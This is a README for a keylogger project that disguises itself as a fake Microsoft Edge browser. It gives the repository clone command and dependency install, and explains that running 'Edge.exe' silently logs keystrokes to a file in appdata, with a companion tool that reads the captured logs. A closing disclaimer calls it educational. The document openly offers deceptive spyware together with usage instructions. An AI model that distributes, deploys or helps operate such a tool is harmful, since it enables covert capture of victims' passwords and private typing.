# Keylogger

In this implementation of the keylogger, the main idea is to create a fake browser page. I have implemented it for *Microsoft Edge*, but you can indeed change it from the source code.

The `.exe` files are created by using [pyinstaller](https://github.com/pyinstaller/pyinstaller), which is an excellent tool to convert `.py` files to `.exe`.

## Installation

You can easily install the keylogger by either cloning the repository:

    git clone https://github.com/seVenVo1d/keylogger.git

or via downloading as ZIP. You can simply run

    python3 -m pip install pynput

to install the requirements (if you are going to use the `.py` files).

## User Guide

You can either use the `.py` files or `.exe` files to start the keylogging process.

`Edge.exe` is the fake browser application. Starting it will also start the keylogging process and save the output in `appdata\log.txt`

`LogReader.exe` is the another application that I have written to convert the keylogger outputs into a more readable format

`edit.spec.txt` is the file that contains information that I have used to convert `.py` to `.exe`

## Disclaimer

This tool is for educational purpose only, usage of keylogger for attacking targets without prior mutual consent is illegal. I accept no liability and not responsible for any misuse or damage cause by this program.
